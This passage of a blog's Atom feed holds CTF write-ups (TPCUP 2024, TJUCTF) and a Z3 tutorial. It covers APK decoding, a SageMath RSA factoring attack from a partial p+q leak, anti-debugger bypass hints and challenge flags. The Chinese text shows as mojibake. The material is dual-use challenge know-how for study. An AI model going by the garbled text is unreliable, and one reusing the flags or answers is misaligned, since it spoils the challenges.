class="string">&quot;138&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans4&quot;</span><span class="punctuation">:</span><span class="string">&quot;D206&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">è¿™æ˜¯flag1flag<span class="punctuation">&#123;</span>wHO0ps_woc50_he<span class="punctuation">&#125;</span></span><br><span class="line">è¿™æ˜¯flag2flag<span class="punctuation">&#123;</span>a1_lA1_zI_gU0_T</span><br></pre></td></tr></table></figure><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><blockquote><p>ç­”é”™å‡ºé¢˜äººäº†ï¼Œæ‚²ï¼ˆ</p></blockquote><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>ã€æ•°æ®åˆ é™¤ã€‘<del>(æ¥è‡ªç¾¤èŠå¤©è®°å½•ï¼‰</del></p><h2 id="èººå¹³èŠå¤©å®¤2-0"><a href="#èººå¹³èŠå¤©å®¤2-0" class="headerlink" title="èººå¹³èŠå¤©å®¤2.0"></a>èººå¹³èŠå¤©å®¤2.0</h2><p>ç”¨ jadx-gui é€†å‘ apkï¼Œåœ¨ com.zhizi42.tpc2024.MainActivity æ‰¾åˆ°ä¸»è¦é€»è¾‘</p><h3 id="flag1-4"><a href="#flag1-4" class="headerlink" title="flag1"></a>flag1</h3><p>ç›´æ¥æŸ¥çœ‹å­—ç¬¦ä¸²</p><p><code>flag&#123;Th1s_1s_s0_s1mp1e&#125;</code></p><h3 id="flag2-4"><a href="#flag2-4" class="headerlink" title="flag2"></a>flag2</h3><p>base64 è§£ç  <code>ZmxhZ3tmbGFnYmFzZTY0fQ==</code><br><code>flag&#123;flagbase64&#125;</code></p><h3 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h3><p>ç‚¹å¼€ t2 å¯æ‰¾åˆ°<br>AES&#x2F;ECB&#x2F;PKCS5Padding è§£å¯† <code>e+Fy/ONEqoJVBIXzCLZ6Kx+vjukEgXFkOaet9ti3hrc=</code>ï¼Œå¯†é’¥æ˜¯ flag2<br><code>flag&#123;alldone!!!&#125;</code></p><h2 id="ä¸»å”±å¤ªæ‹¼å‘½äº†"><a href="#ä¸»å”±å¤ªæ‹¼å‘½äº†" class="headerlink" title="ä¸»å”±å¤ªæ‹¼å‘½äº†"></a>ä¸»å”±å¤ªæ‹¼å‘½äº†</h2><p>RSA å·²çŸ¥éƒ¨åˆ†é«˜ä½æ”»å‡»ï¼Œä½†æ•™ç¨‹ä¸€èˆ¬ç»™çš„æ˜¯å·²çŸ¥ p é«˜ä½ï¼Œæ²¡æœ‰å·²çŸ¥ p+q é«˜ä½çš„è§£æ³•<br>è¿™é‡Œ <a href="https://github.com/7feilee/ctf_writeup/blob/master/2020/HITCTF/crypto_dgk/src/solve.sage">https://github.com/7feilee/ctf_writeup&#x2F;blob&#x2F;master&#x2F;2020&#x2F;HITCTF&#x2F;crypto_dgk&#x2F;src&#x2F;solve.sage</a> æä¾›äº†</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p_pro = (p_add_q + <span class="built_in">int</span>(sqrt(p_add_q * p_add_q - <span class="number">4</span> * n))) // <span class="number">2</span></span><br></pre></td></tr></table></figure><p>ç¨å¾®æ”¹äº†ä¸€ä¸‹è„šæœ¬ç”¨ sage æ±‚è§£ p å’Œ q</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = <span class="number">99043577182118444378439642285640047958394971312102035300983634002184849658224373873268060886833728612494565170803226359641468271537155385458029052632983980837449378159671374748926031921883773305189594299358694724069728793519164632228950998545505807640604956250832692344226382573121014842953275020353743587393</span></span><br><span class="line">p_add_q = <span class="number">19908296297154261193603784476638931123516240704025306244561930935833463971799128110489967448460913311580547389743367260902522865073200825917723058108366848</span></span><br><span class="line">p_pro = (p_add_q + <span class="built_in">int</span>(sqrt(p_add_q * p_add_q - <span class="number">4</span> * n))) // <span class="number">2</span></span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(n), implementation = <span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">poly = p_pro + x</span><br><span class="line">x0 = poly.small_roots(X = <span class="number">2</span> ** <span class="number">100</span>, beta = <span class="number">0.4</span>)</span><br><span class="line">p = <span class="built_in">int</span>(gcd(p_pro + x0[<span class="number">0</span>], n))</span><br><span class="line">q = n // <span class="built_in">int</span>(p)</span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure><p>æ±‚å¾— p å’Œ q åå¯ä»¥è§£å¯†</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, inverse</span><br><span class="line"></span><br><span class="line">c = <span class="number">18440872486403323622510807012978507180529941426106643115456980837956295325764192595485820729772845428753953590301713705078399201869365193708057327848899904074671832807596665367550614919055119509073812499316019447070077472419739116237952486260179612984582496862441609849035603842161839069407115218245681423369</span></span><br><span class="line">n = <span class="number">99043577182118444378439642285640047958394971312102035300983634002184849658224373873268060886833728612494565170803226359641468271537155385458029052632983980837449378159671374748926031921883773305189594299358694724069728793519164632228950998545505807640604956250832692344226382573121014842953275020353743587393</span></span><br><span class="line">e = bytes_to_long(<span class="string">b&quot;too desperate!&quot;</span>)</span><br><span class="line">p = <span class="number">10157834627517369652898607336515095650881694895149683559384292084371259269447224625631118311560267756403388223138257762142383835818056617774624176508335047</span></span><br><span class="line">q = <span class="number">9750461669636891540705177140123835472634545808875622685177638851462204702351903484858849136900645555177159166605109498760139029255144208849671942596334519</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><p><code>flag&#123;th3_w0rld_1s_An0n_t0ky0&#125;</code></p><h2 id="æŠ•ç¨¿-CrackMe"><a href="#æŠ•ç¨¿-CrackMe" class="headerlink" title="[æŠ•ç¨¿]CrackMe"></a>[æŠ•ç¨¿]CrackMe</h2><p>ç”±äºæ˜¯é™æ€ flagï¼Œå› æ­¤åªè¦ç»•è¿‡è°ƒè¯•æ£€æµ‹å (åœ¨ <code>isDebuggerPresent</code>ã€<code>anti_debugger</code> åˆ¤æ–­å¤„ä¸‹æ–­ç‚¹è¿”å›å€¼æ”¹æˆ 0)ï¼Œåœ¨ <code>RSADecryptor</code> å‡½æ•°éƒ¨åˆ†ä¸‹æ–­ç‚¹è·å– v4 çš„å€¼å°±æ˜¯ flag</p><p><code>flag&#123;Xyu_h0is_z7Qs_l0VE&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TPCUP-2024&quot;&gt;&lt;a href=&quot;#TPCUP-2024&quot; class=&quot;headerlink&quot; title=&quot;TPCUP 2024&quot;&gt;&lt;/a&gt;TPCUP 2024&lt;/h1&gt;&lt;h2 id=&quot;Xâ€¦ä»€ä¹ˆï¼Ÿ&quot;&gt;&lt;a href=&quot;#Xâ€¦ä»€ä¹ˆï¼Ÿ&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ç­‰å¼é—®é¢˜ä¸z3çš„ä½¿ç”¨</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/%E7%AD%89%E5%BC%8F%E9%97%AE%E9%A2%98%E5%92%8CZ3%E4%BD%BF%E7%94%A8/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/%E7%AD%89%E5%BC%8F%E9%97%AE%E9%A2%98%E5%92%8CZ3%E4%BD%BF%E7%94%A8/</id>
    <published>2024-02-25T16:00:00.000Z</published>
    <updated>2024-09-16T07:40:23.005Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç­‰å¼é—®é¢˜ä¸-z3-çš„ä½¿ç”¨"><a href="#ç­‰å¼é—®é¢˜ä¸-z3-çš„ä½¿ç”¨" class="headerlink" title="ç­‰å¼é—®é¢˜ä¸ z3 çš„ä½¿ç”¨"></a><strong>ç­‰å¼é—®é¢˜ä¸</strong> <strong>z3</strong> <strong>çš„ä½¿ç”¨</strong></h1><h3 id="åŸºæœ¬æ•°æ®ç±»å‹"><a href="#åŸºæœ¬æ•°æ®ç±»å‹" class="headerlink" title="åŸºæœ¬æ•°æ®ç±»å‹"></a><strong>åŸºæœ¬æ•°æ®ç±»å‹</strong></h3><p>åœ¨Pythonä¸­ä½¿ç”¨ Z3 æ¨¡å—ï¼Œæˆ‘ä»¬çš„æ‰€æ±‚ç»“æœä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ç§æ•°æ®ç±»å‹ï¼š</p><ul><li><p><strong>Int</strong></p></li><li><p>Real</p></li><li><p>Bool</p></li><li><p>Array</p></li><li><p><strong>BitVec(â€˜aâ€™, 8)</strong></p></li></ul><p>å…¶ä¸­ BitVec å¯ä»¥æ˜¯ç‰¹å®šå¤§å°çš„æ•°æ®ç±»å‹ï¼Œä¸ä¸€å®šæ˜¯ 8 ä½ï¼Œä¾‹å¦‚ C è¯­è¨€ä¸­çš„ int å‹å¯ä»¥ç”¨ BitVec(â€˜aâ€™, 32)</p><p>è¡¨ç¤ºã€‚</p><h3 id="åŸºæœ¬è¯­å¥"><a href="#åŸºæœ¬è¯­å¥" class="headerlink" title="åŸºæœ¬è¯­å¥"></a><strong>åŸºæœ¬è¯­å¥</strong></h3><p>åœ¨ Python ä¸­ä½¿ç”¨è¯¥æ¨¡å—ï¼Œæˆ‘ä»¬é€šå¸¸ç”¨åˆ°å¦‚ä¸‹å‡ ä¸ª APIï¼š</p><ul><li><p>**Solver()**ï¼šåˆ›å»ºä¸€ä¸ªé€šç”¨æ±‚è§£å™¨ï¼Œä»¥è¿›è¡Œä¸‹ä¸€æ­¥çš„æ±‚è§£</p></li><li><p>**add()**ï¼šæ·»åŠ çº¦æŸæ¡ä»¶ï¼Œé€šå¸¸åœ¨solver()å‘½ä»¤ä¹‹åï¼Œæ·»åŠ çš„çº¦æŸæ¡ä»¶é€šå¸¸æ˜¯ä¸€ä¸ªé€»è¾‘ç­‰å¼</p></li><li><p>**check()**ï¼šæ·»åŠ å®Œçº¦æŸæ¡ä»¶åï¼Œç”¨æ¥æ¥æ£€æµ‹è§£çš„æƒ…å†µï¼Œæœ‰è§£çš„æ—¶å€™ä¼šè¿”å› satï¼Œæ— è§£çš„æ—¶å€™ä¼šè¿”å›unsat</p></li><li><p>**model()**ï¼šåœ¨å­˜åœ¨è§£çš„æ—¶å€™ï¼Œè¯¥å‡½æ•°ä¼šå°†æ¯ä¸ªé™åˆ¶æ¡ä»¶æ‰€å¯¹åº”çš„è§£é›†çš„äº¤é›†ï¼Œè¿›è€Œå¾—å‡ºæ­£è§£</p></li></ul><p>åˆ†åˆ«å¯¹åº”è®¾æœªçŸ¥æ•°ï¼Œåˆ—æ–¹ç¨‹ç»„ï¼Œåˆ¤æ–­æ–¹ç¨‹æ˜¯å¦æœ‰è§£ï¼Œè§£æ–¹ç¨‹ç»„ã€‚</p><h3 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a><strong>ç®€å•ä½¿ç”¨</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240302165337491.png" alt="image-20240302165337491"></p><h3 id="å…¥é—¨å®è·µ"><a href="#å…¥é—¨å®è·µ" class="headerlink" title="å…¥é—¨å®è·µ"></a><strong>å…¥é—¨å®è·µ</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">b = Int(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">c = Int(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">d = Int(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(b == a - <span class="number">2</span>)</span><br><span class="line">s.add(d == c + <span class="number">2</span>)</span><br><span class="line">s.add(d == a + <span class="number">5</span>)</span><br><span class="line">s.add(b - <span class="number">20</span> + c - <span class="number">20</span> == <span class="number">15</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="comment"># _solve = s.model()</span></span><br><span class="line"><span class="comment"># print(_solve)</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240302165540789.png" alt="image-20240302165540789"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">code = [Int(<span class="built_in">str</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GoodValueBadPlace</span>(<span class="params">nums, count</span>):</span><br><span class="line">    exps = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                exps.append(If(nums[i] == code[j], <span class="number">1</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> Sum(exps) == count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># one number is correct and well-placed</span></span><br><span class="line">s.add(Or(code[<span class="number">0</span>] == <span class="number">2</span>, code[<span class="number">1</span>] == <span class="number">9</span>, code[<span class="number">2</span>] == <span class="number">1</span>))</span><br><span class="line"><span class="comment"># one number is correct but wrong placed</span></span><br><span class="line">s.add(GoodValueBadPlace([<span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>], <span class="number">1</span>))</span><br><span class="line"><span class="comment"># two numbers are correct but wrong placed</span></span><br><span class="line">s.add(GoodValueBadPlace([<span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>], <span class="number">2</span>))</span><br><span class="line"><span class="comment"># nothing is correct</span></span><br><span class="line">s.add(And(code[<span class="number">0</span>] != <span class="number">5</span>, code[<span class="number">1</span>] != <span class="number">7</span>, code[<span class="number">2</span>] != <span class="number">9</span>))</span><br><span class="line"><span class="comment"># one number is correct but wrong placed</span></span><br><span class="line">s.add(GoodValueBadPlace([<span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>], <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> code:</span><br><span class="line">        <span class="built_in">print</span>(m[c], end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç­‰å¼é—®é¢˜ä¸-z3-çš„ä½¿ç”¨&quot;&gt;&lt;a href=&quot;#ç­‰å¼é—®é¢˜ä¸-z3-çš„ä½¿ç”¨&quot; class=&quot;headerlink&quot; title=&quot;ç­‰å¼é—®é¢˜ä¸ z3 çš„ä½¿ç”¨&quot;&gt;&lt;/a&gt;&lt;strong&gt;ç­‰å¼é—®é¢˜ä¸&lt;/strong&gt; &lt;strong&gt;z3&lt;/strong&gt; &lt;strong</summary>
      
    
    
    
    
    <category term="Z3 RE CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/Z3-RE-CTF/"/>
    
  </entry>
  
  <entry>
    <title>TJUCTF202401WP</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/25/TJUCTF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/25/TJUCTF/</id>
    <published>2024-02-24T16:00:00.000Z</published>
    <updated>2024-09-16T07:13:30.497Z</updated>
    
    <content type="html"><![CDATA[<p>TJUCTF{KFC_Cr42y_Thur5d4y_v_M3_50!}</p><p>base16:544A554354467B4B46435F43723432795F54687572356434795F765F4D335F3530217D</p><p>base32:GU2DIQJVGU2DGNJUGQ3DOQRUII2DMNBTGVDDIMZXGIZTIMZSG44TKRRVGQ3DQNZVG4ZDGNJWGQZTINZZGVDDONRVIY2EIMZTGVDDGNJTGAZDCN2E</p><p>base64:R1UyRElRSlZHVTJER05KVUdRM0RPUVJVSUkyRE1OQlRHVkRESU1aWEdJWlRJTVpTRzQ0VEtSUlZHUTNEUU5aVkc0WkRHTkpXR1FaVElOWlpHVkRET05SVklZMkVJTVpUR1ZEREdOSlRHQVpEQ04yRQ&#x3D;&#x3D;</p><p>base 91:</p><p>&amp;wâ€dA6D<em>t7f!}DfeFdJz<del>hF#Q8Jz@7</del>Q^tu0Z0+SB8</em>@@7dR#ww2&gt;y,#t7JbAPQiCP;1j95NGNlf{x{cPxXx*wnTAPPlo77d_OAeul[j@#F)1l<del>cF5nJS!nHg5rfFw_b%i@J!83NRM</del>(Ikge`ipeq;O6:Oâ€(XafRFP(dv+4SET$LI,tn1wWEW&#96;nH.3e</p><p>base100:ğŸğŸ‘®ğŸ™ğŸ‘›SğŸ¸ğŸ­ğŸ»ğŸ¡ğŸ‘«ğŸ®ğŸ‘ğŸ˜ğŸ‘´ğŸ»ğŸ‘ğŸ‘œğŸ½ğŸ‘›ğŸ‘ğŸ‘±ğŸ‘µğŸ‘ŸğŸ½ğŸšğŸ‘ˆğŸ¯ğŸ‘ğŸ‘±ğŸ·ğŸ®ğŸ‘µğŸ‘ˆğŸ‘•ğŸ‘«ğŸ‘¬ğŸ§ğŸ‘‘ğŸ§ğŸ¢ğŸ‘ŠğŸ¹ğŸ¯ğŸ¡ğŸ·ğŸ·ğŸ®ğŸ‘›ğŸ‘‰ğŸšğŸ‘®ğŸ‘®ğŸ©ğŸµğŸ‘°ğŸ£ğŸšğŸ‘«ğŸ®ğŸ‘ğŸ‘™ğŸ¸ğŸ‘‡ğŸ‘ˆğŸ‘ ğŸºğŸ‘‡ğŸ²ğŸ¨ğŸ‘¡ğŸ°ğŸ¬ğŸ‘…ğŸ¾ğŸ‘…ğŸ‘£ğŸ‘ğŸ‘²ğŸ‘¯ğŸ‘²ğŸ‘šğŸ‘‡ğŸ‘¯ğŸ‘ğŸ‘¯ğŸ¡ğŸ‘®ğŸ‘¥ğŸ‘‹ğŸ¸ğŸ‘‡ğŸ‘‡ğŸ‘£ğŸ‘¦ğŸ®ğŸ®ğŸ‘›ğŸ‘–ğŸ‘†ğŸ¸ğŸ‘œğŸ‘¬ğŸ‘£ğŸ‘’ğŸ‘¡ğŸ·ğŸšğŸ½ğŸ ğŸ¨ğŸ‘£ğŸ‘µğŸ‘šğŸ½ğŸ¬ğŸ‘¥ğŸ‘ğŸ‘ŠğŸ˜ğŸ‘¥ğŸ¿ğŸ‘ğŸ¬ğŸ‘©ğŸ‘ğŸ½ğŸ‘®ğŸ‘–ğŸ‘™ğŸœğŸ‘ ğŸ·ğŸ‘ğŸ˜ğŸ¯ğŸªğŸ‘…ğŸ‘‰ğŸ‘„ğŸ‘µğŸŸğŸ‘€ğŸ‘¢ğŸ‘ğŸ‘œğŸ‘—ğŸ‘ ğŸ‘§ğŸ‘œğŸ‘¨ğŸ²ğŸ‘†ğŸ­ğŸ±ğŸ‘†ğŸ™ğŸŸğŸ‘ğŸ‘˜ğŸ‘ğŸ‘‰ğŸ½ğŸ‘‡ğŸŸğŸ‘›ğŸ‘­ğŸ¢ğŸ«ğŸ‘ŠğŸ¼ğŸ‘‹ğŸ›ğŸ‘ƒğŸ‘€ğŸ£ğŸ‘«ğŸ‘¥ğŸ¨ğŸ‘®ğŸ‘ğŸ¼ğŸ‘ğŸ‘—ğŸ‘¥ğŸ¿ğŸ¥ğŸªğŸ‘œ</p><p><a href="https://www.cnblogs.com/chddt/p/13262385.html">äº‹ä»¶ID</a></p><p><a href="https://www.cnblogs.com/chddt/p/13262385.html">https://www.cnblogs.com/chddt/p/13262385.html</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="æˆ‘flagå‘¢ï¼Ÿ"><a href="#æˆ‘flagå‘¢ï¼Ÿ" class="headerlink" title="æˆ‘flagå‘¢ï¼Ÿ"></a>æˆ‘flagå‘¢ï¼Ÿ</h3><p>**[å›¾ç‰‡éšå†™]**winhexä¿®æ”¹å›¾ç‰‡é•¿åº¦</p><h3 id="æ˜¯æ—¶å€™å‘æŒ¥ç¤¾å·¥æœ¬é¢†äº†"><a href="#æ˜¯æ—¶å€™å‘æŒ¥ç¤¾å·¥æœ¬é¢†äº†" class="headerlink" title="æ˜¯æ—¶å€™å‘æŒ¥ç¤¾å·¥æœ¬é¢†äº†"></a>æ˜¯æ—¶å€™å‘æŒ¥ç¤¾å·¥æœ¬é¢†äº†</h3><p>ç™¾åº¦è¯†å›¾</p><h3 id="bases"><a href="#bases" class="headerlink" title="bases"></a>bases</h3><p>**[å¤šé‡åŠ å¯†]**base100â€“91â€“64â€“32â€“16</p><h3 id="tttupperï¼"><a href="#tttupperï¼" class="headerlink" title="tttupperï¼"></a>tttupperï¼</h3><p>**[tupperåŠ å¯†]**ç”¨ç°æœ‰çš„å·¥å…·</p><h3 id="VVVigenere"><a href="#VVVigenere" class="headerlink" title="VVVigenere"></a>VVVigenere</h3><p><strong>[VigenereåŠ å¯†]</strong></p><h3 id="å¤©å¤–è™«é¸£"><a href="#å¤©å¤–è™«é¸£" class="headerlink" title="å¤©å¤–è™«é¸£"></a>å¤©å¤–è™«é¸£</h3><p>[ç‰¹æ®Šä¼ æ’­æ–¹å¼]SSTV</p><h3 id="è·¯è¿‡ä»€ä¹ˆéƒ½è¦æ‹"><a href="#è·¯è¿‡ä»€ä¹ˆéƒ½è¦æ‹" class="headerlink" title="è·¯è¿‡ä»€ä¹ˆéƒ½è¦æ‹"></a>è·¯è¿‡ä»€ä¹ˆéƒ½è¦æ‹</h3><p>**[ç¤¾å·¥]**æ ¹æ®å›¾ç‰‡ä¸­ä¸‰æ˜Ÿå †å’Œæˆéƒ½åœ°é“æ ‡å¿—ï¼ŒçŒœæµ‹å¾·é˜³ç«™</p><h3 id="å”‰ï¼æ— å°½çš„æ‹‰æ ¼æœ—æ—¥ï¼"><a href="#å”‰ï¼æ— å°½çš„æ‹‰æ ¼æœ—æ—¥ï¼" class="headerlink" title="å”‰ï¼æ— å°½çš„æ‹‰æ ¼æœ—æ—¥ï¼"></a>å”‰ï¼æ— å°½çš„æ‹‰æ ¼æœ—æ—¥ï¼</h3><p>keyæ˜¯16è¿›åˆ¶è½¬å­—ç¬¦åæ–‡å­—åŠ å¯†</p><p>éŸ³é¢‘å‡ºå¯†ç ï¼Œæ³¨æ„æ–‡ä»¶åè¦å¤§å†™ï¼Œsteghideéšå†™</p><h3 id="è¿›é˜¶-æ—¥å¿—åˆ†æ"><a href="#è¿›é˜¶-æ—¥å¿—åˆ†æ" class="headerlink" title="[è¿›é˜¶]æ—¥å¿—åˆ†æ"></a>[è¿›é˜¶]æ—¥å¿—åˆ†æ</h3><p>ç”µè„‘ä¸æ–¹ä¾¿çœ‹ï¼Œè½¬æˆtxtæˆ–è€…csvï¼Œ</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="å…¥é—¨-ä»å¤´å¼€å§‹äº†è§£é€†å‘"><a href="#å…¥é—¨-ä»å¤´å¼€å§‹äº†è§£é€†å‘" class="headerlink" title="[å…¥é—¨]ä»å¤´å¼€å§‹äº†è§£é€†å‘"></a>[å…¥é—¨]ä»å¤´å¼€å§‹äº†è§£é€†å‘</h3><p>ä¸€ä¸ªç®€å•çš„å¼‚æˆ–æ“ä½œ</p><h3 id="å…¥é—¨-111çœŸç­¾åˆ°"><a href="#å…¥é—¨-111çœŸç­¾åˆ°" class="headerlink" title="[å…¥é—¨]111çœŸç­¾åˆ°"></a>[å…¥é—¨]111çœŸç­¾åˆ°</h3><p>ç”¨IDAçœ‹ç¨‹åºçš„ç®€å•å¼‚æˆ–æ“ä½œ</p><h3 id="è„‘æ´-Artï¼"><a href="#è„‘æ´-Artï¼" class="headerlink" title="[è„‘æ´]Artï¼"></a>[è„‘æ´]Artï¼</h3><p>ä¿®æ”¹IDAæœ€é«˜å±•ç¤ºå­—èŠ‚ç ï¼Œåœ¨ç¼©ç•¥å›¾çœ‹flag</p><h3 id="åŸºç¡€-Soyoï¼Œæ¥æ¯çº¢èŒ¶"><a href="#åŸºç¡€-Soyoï¼Œæ¥æ¯çº¢èŒ¶" class="headerlink" title="[åŸºç¡€]Soyoï¼Œæ¥æ¯çº¢èŒ¶"></a>[åŸºç¡€]Soyoï¼Œæ¥æ¯çº¢èŒ¶</h3><p>æç¤ºæ˜¯teaåŠ å¯†ï¼Œçœ‹ç‰¹å¾å’Œkeyå€¼</p><p>ç„¶åteaè§£ç </p><h3 id="è„‘æ´-æƒ³ç©å„¿çº¢ç™½æœºäº†"><a href="#è„‘æ´-æƒ³ç©å„¿çº¢ç™½æœºäº†" class="headerlink" title="[è„‘æ´]æƒ³ç©å„¿çº¢ç™½æœºäº†"></a>[è„‘æ´]æƒ³ç©å„¿çº¢ç™½æœºäº†</h3><h4 id="æ³•ä¸€ï¼š"><a href="#æ³•ä¸€ï¼š" class="headerlink" title="æ³•ä¸€ï¼š"></a>æ³•ä¸€ï¼š</h4><p>å¥½ç”¨çš„å·¥å…·ï¼Œ</p><h4 id="æ³•äºŒï¼š"><a href="#æ³•äºŒï¼š" class="headerlink" title="æ³•äºŒï¼š"></a>æ³•äºŒï¼š</h4><p>äº†è§£ç¨‹åºè¿è¡Œå†…å®¹ï¼Œå†™è„šæœ¬</p><h3 id="åŸºç¡€-ezRE"><a href="#åŸºç¡€-ezRE" class="headerlink" title="[åŸºç¡€]ezRE"></a>[åŸºç¡€]ezRE</h3><h4 id="æ³•ä¸€ï¼š-1"><a href="#æ³•ä¸€ï¼š-1" class="headerlink" title="æ³•ä¸€ï¼š"></a>æ³•ä¸€ï¼š</h4><p>ollvmåæ··æ·†</p><h4 id="æ³•äºŒï¼šï¼ˆéé¢„æœŸï¼‰"><a href="#æ³•äºŒï¼šï¼ˆéé¢„æœŸï¼‰" class="headerlink" title="æ³•äºŒï¼šï¼ˆéé¢„æœŸï¼‰"></a>æ³•äºŒï¼šï¼ˆéé¢„æœŸï¼‰</h4><p>çœ‹ç¨‹åºæ¨ç†åŠ å¯†æ–¹å¼ï¼Œ</p><p>å…ˆæ”¹è¡¨ï¼Œå†åŠ å¯†</p><p>å—¯â€¦â€¦å¾ˆç®€å•ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;TJUCTF{KFC_Cr42y_Thur5d4y_v_M3_50!}&lt;/p&gt;
&lt;p&gt;base16:544A554354467B4B46435F43723432795F54687572356434795F765F4D335F3530217D&lt;/p&gt;
&lt;p&gt;base32:GU</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ç¬¦å·æ‰§è¡Œæ¡†æ¶</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/18/angr_%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6angr/"/>
